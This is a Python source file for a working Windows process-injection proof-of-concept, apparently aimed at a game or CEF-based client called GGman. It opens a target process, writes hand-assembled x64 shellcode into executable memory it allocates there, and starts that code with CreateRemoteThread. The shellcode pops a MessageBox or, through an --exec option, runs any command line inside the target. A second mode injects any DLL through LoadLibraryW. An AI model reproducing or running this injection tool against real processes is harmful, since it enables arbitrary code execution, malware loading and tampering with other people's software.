"""Classic remote-code-execution PoC for a live Windows process, pure ctypes.

Two modes:
  * shellcode: allocate RWX in the target, write x64 code that calls MessageBoxW,
    CreateRemoteThread it. Proves arbitrary native code execution in the target.
  * dll: CreateRemoteThread(LoadLibraryW(path)) and verify the module appears in
    the target's module list.

Addresses for kernel32/user32 are resolved per-target by comparing module bases,
because system DLLs are mapped at the same image base in every process of a boot.

Usage:
  python lol_inject_poc.py --pid 14916 --text "hello from inside" --caption GGman
  python lol_inject_poc.py --pid 14916 --dll C:\\Windows\\System32\\winmm.dll
  python lol_inject_poc.py --pid 14916 --modules          # list target modules
  python lol_inject_poc.py --pid 14916 --close-dialog GGman
"""
import argparse
import ctypes
import ctypes.wintypes as wt
import struct
import sys
import time

k32 = ctypes.WinDLL('kernel32', use_last_error=True)
user32 = ctypes.WinDLL('user32', use_last_error=True)

PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT_RESERVE = 0x3000
PAGE_EXECUTE_READWRITE = 0x40
TH32CS_SNAPMODULE = 0x00000008
TH32CS_SNAPMODULE32 = 0x00000010
INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value


class MODULEENTRY32(ctypes.Structure):
    _fields_ = [('dwSize', wt.DWORD), ('th32ModuleID', wt.DWORD), ('th32ProcessID', wt.DWORD),
                ('GlblcntUsage', wt.DWORD), ('ProccntUsage', wt.DWORD), ('modBaseAddr', ctypes.POINTER(ctypes.c_byte)),
                ('modBaseSize', wt.DWORD), ('hModule', wt.HMODULE), ('szModule', ctypes.c_char * 256),
                ('szExePath', ctypes.c_char * 260)]


def module_base(pid, name):
    snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid)
    if snap == INVALID_HANDLE_VALUE:
        raise ctypes.WinError(ctypes.get_last_error())
    me = MODULEENTRY32()
    me.dwSize = ctypes.sizeof(MODULEENTRY32)
    try:
        ok = k32.Module32First(snap, ctypes.byref(me))
        while ok:
            if me.szModule.decode('mbcs', 'replace').lower() == name.lower():
                return ctypes.cast(me.modBaseAddr, ctypes.c_void_p).value
            ok = k32.Module32Next(snap, ctypes.byref(me))
    finally:
        k32.CloseHandle(snap)
    return None


def list_modules(pid):
    snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid)
    me = MODULEENTRY32()
    me.dwSize = ctypes.sizeof(MODULEENTRY32)
    out = []
    ok = k32.Module32First(snap, ctypes.byref(me))
    while ok:
        out.append((me.szModule.decode('mbcs', 'replace'),
                    ctypes.cast(me.modBaseAddr, ctypes.c_void_p).value, me.modBaseSize))
        ok = k32.Module32Next(snap, ctypes.byref(me))
    k32.CloseHandle(snap)
    return out


def open_process(pid):
    h = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h:
        raise ctypes.WinError(ctypes.get_last_error())
    return h


def remote_write(h, data, base=None):
    if base is None:
        k32.VirtualAllocEx.restype = ctypes.c_void_p
        base = k32.VirtualAllocEx(h, None, len(data), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        if not base:
            raise ctypes.WinError(ctypes.get_last_error())
    written = ctypes.c_size_t(0)
    if not k32.WriteProcessMemory(h, ctypes.c_void_p(base), data, len(data), ctypes.byref(written)):
        raise ctypes.WinError(ctypes.get_last_error())
    return base


def remote_thread(h, addr, wait=True, param=None):
    tid = wt.DWORD(0)
    th = k32.CreateRemoteThread(h, None, 0, ctypes.c_void_p(addr), ctypes.c_void_p(param), 0, ctypes.byref(tid))
    if not th:
        raise ctypes.WinError(ctypes.get_last_error())
    if wait:
        k32.WaitForSingleObject(th, 15000)
    return th, tid.value


def shellcode_exec(cmd_addr, winexec_addr):
    sc = b''
    sc += b'\x48\x83\xec\x28'                             # sub rsp, 0x28
    sc += b'\x48\xb9' + struct.pack('<Q', cmd_addr)       # mov rcx, imm64
    sc += b'\xba\x01\x00\x00\x00'                         # mov edx, 1 (SW_SHOWNORMAL)
    sc += b'\x48\xb8' + struct.pack('<Q', winexec_addr)   # mov rax, imm64
    sc += b'\xff\xd0'                                     # call rax
    sc += b'\x48\x83\xc4\x28'                             # add rsp, 0x28
    sc += b'\x31\xc0'                                     # xor eax, eax
    sc += b'\xc3'                                         # ret
    return sc


def shellcode_messagebox(text_addr, caption_addr, msgbox_addr, flags=0x40):
    sc = b''
    sc += b'\x31\xc9'                                    # xor ecx, ecx
    sc += b'\x48\xba' + struct.pack('<Q', text_addr)      # mov rdx, imm64
    sc += b'\x49\xb8' + struct.pack('<Q', caption_addr)   # mov r8, imm64
    sc += b'\x41\xb9' + struct.pack('<I', flags)          # mov r9d, imm32
    sc += b'\x48\x83\xec\x28'                             # sub rsp, 0x28
    sc += b'\x48\xb8' + struct.pack('<Q', msgbox_addr)    # mov rax, imm64
    sc += b'\xff\xd0'                                     # call rax
    sc += b'\x48\x83\xc4\x28'                             # add rsp, 0x28
    sc += b'\x31\xc0'                                     # xor eax, eax
    sc += b'\xc3'                                         # ret
    return sc


def find_dialog(pid, title):
    found = []

    @ctypes.WINFUNCTYPE(wt.BOOL, wt.HWND, wt.LPARAM)
    def cb(h, lp):
        p = wt.DWORD()
        user32.GetWindowThreadProcessId(h, ctypes.byref(p))
        if p.value == pid:
            buf = ctypes.create_unicode_buffer(512)
            user32.GetWindowTextW(h, buf, 512)
            if buf.value == title:
                found.append(h)
        return True

    user32.EnumWindows(cb, 0)
    return found


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--pid', type=int, required=True)
    ap.add_argument('--text', default='GGman injection PoC')
    ap.add_argument('--caption', default='GGman')
    ap.add_argument('--dll')
    ap.add_argument('--exec', dest='exec_cmd', help='WinExec a command line inside the target')
    ap.add_argument('--flags', type=lambda x: int(x, 0), default=0x40, help='MessageBox flags')
    ap.add_argument('--modules', action='store_true')
    ap.add_argument('--close-dialog')
    ap.add_argument('--hold', type=float, default=0.0, help='seconds to keep the dialog before closing')
    args = ap.parse_args()

    if args.modules:
        mods = list_modules(args.pid)
        print(f'{len(mods)} modules in pid {args.pid}')
        for name, base, size in mods:
            if any(k in name.lower() for k in ('cef', 'libcef', 'user32', 'kernel32', 'winmm', 'ggman')):
                print(f'  0x{base:016X} {size:>10} {name}')
        return 0

    if args.close_dialog:
        for h in find_dialog(args.pid, args.close_dialog):
            print('closing dialog hwnd', h)
            user32.PostMessageW(h, 0x0010, 0, 0)
        return 0

    hproc = open_process(args.pid)
    print(f'OpenProcess(pid={args.pid}) -> 0x{hproc:X}')

    if args.dll:
        k32.GetProcAddress.restype = ctypes.c_void_p
        k32.GetModuleHandleW.restype = ctypes.c_void_p
        local_k32 = k32.GetModuleHandleW('kernel32.dll')
        local_load = ctypes.cast(k32.GetProcAddress(ctypes.c_void_p(local_k32), b'LoadLibraryW'), ctypes.c_void_p).value
        target_k32 = module_base(args.pid, 'kernel32.dll')
        offset = local_load - local_k32
        target_load = target_k32 + offset
        print(f'kernel32 base local=0x{local_k32:X} target=0x{target_k32:X} LoadLibraryW=0x{target_load:X}')
        path = args.dll.encode('utf-16-le') + b'\x00\x00'
        buf = remote_write(hproc, path, None)
        print(f'wrote UTF-16 path at 0x{buf:X}')
        th, tid = remote_thread(hproc, target_load, wait=True, param=buf)
        print(f'CreateRemoteThread -> tid {tid}')
        code = wt.DWORD(0)
        k32.GetExitCodeThread(th, ctypes.byref(code))
        print(f'thread exit code (HMODULE low32) = 0x{code.value:X}')
        k32.CloseHandle(th)
        time.sleep(0.5)
        mods = [m for m in list_modules(args.pid) if args.dll.split('\\')[-1].lower() in m[0].lower()]
        print('module now present in target:', mods)
        k32.CloseHandle(hproc)
        return 0 if mods else 4

    # shellcode mode
    k32.GetProcAddress.restype = ctypes.c_void_p
    k32.GetModuleHandleW.restype = ctypes.c_void_p

    if args.exec_cmd:
        local_k32 = k32.GetModuleHandleW('kernel32.dll')
        local_winexec = ctypes.cast(k32.GetProcAddress(ctypes.c_void_p(local_k32), b'WinExec'), ctypes.c_void_p).value
        target_k32 = module_base(args.pid, 'kernel32.dll')
        winexec = target_k32 + (local_winexec - local_k32)
        print(f'kernel32 local=0x{local_k32:X} target=0x{target_k32:X} WinExec=0x{winexec:X}')
        cmd = args.exec_cmd.encode('mbcs') + b'\x00'
        sc = shellcode_exec(0, winexec)
        k32.VirtualAllocEx.restype = ctypes.c_void_p
        base = k32.VirtualAllocEx(hproc, None, 0x400, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        cmd_addr = base + 0x100
        sc = shellcode_exec(cmd_addr, winexec)
        blob = sc.ljust(0x100, b'\x90') + cmd
        remote_write(hproc, blob, base)
        print(f'alloc 0x{base:X}; cmdline at 0x{cmd_addr:X}: {args.exec_cmd!r}')
        th, tid = remote_thread(hproc, base, wait=True)
        print(f'CreateRemoteThread -> tid {tid}')
        k32.CloseHandle(th)
        k32.CloseHandle(hproc)
        return 0

    local_user32 = k32.GetModuleHandleW('user32.dll')
    local_msgbox = ctypes.cast(k32.GetProcAddress(ctypes.c_void_p(local_user32), b'MessageBoxW'), ctypes.c_void_p).value
    target_user32 = module_base(args.pid, 'user32.dll')
    if not target_user32:
        print('user32 not found in target (session mismatch?)')
        return 5
    msgbox = target_user32 + (local_msgbox - local_user32)
    print(f'user32 local=0x{local_user32:X} target=0x{target_user32:X} MessageBoxW=0x{msgbox:X}')

    text = args.text.encode('utf-16-le') + b'\x00\x00'
    caption = args.caption.encode('utf-16-le') + b'\x00\x00'
    sc_len = 51
    pad = (16 - (sc_len % 16)) % 16
    data_off = sc_len + pad

    k32.VirtualAllocEx.restype = ctypes.c_void_p
    base = k32.VirtualAllocEx(hproc, None, 0x200, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
    if not base:
        raise ctypes.WinError(ctypes.get_last_error())
    print(f'VirtualAllocEx(RWX) -> 0x{base:X}')

    text_addr = base + data_off
    cap_addr = text_addr + len(text)
    sc = shellcode_messagebox(text_addr, cap_addr, msgbox, args.flags)
    blob = sc + b'\x90' * pad + text + caption
    remote_write(hproc, blob, base)
    print(f'shellcode {len(sc)} bytes, payload {len(blob)} bytes written')

    th, tid = remote_thread(hproc, base, wait=False)
    print(f'CreateRemoteThread -> tid {tid}; dialog should be up')
    time.sleep(1.2)
    dialogs = find_dialog(args.pid, args.caption)
    print('dialog windows found:', dialogs)
    if args.hold:
        time.sleep(args.hold)
        for h in dialogs:
            user32.PostMessageW(h, 0x0010, 0, 0)
        print('dialog closed')
    k32.CloseHandle(th)
    k32.CloseHandle(hproc)
    return 0 if dialogs else 6


if __name__ == '__main__':
    sys.exit(main())


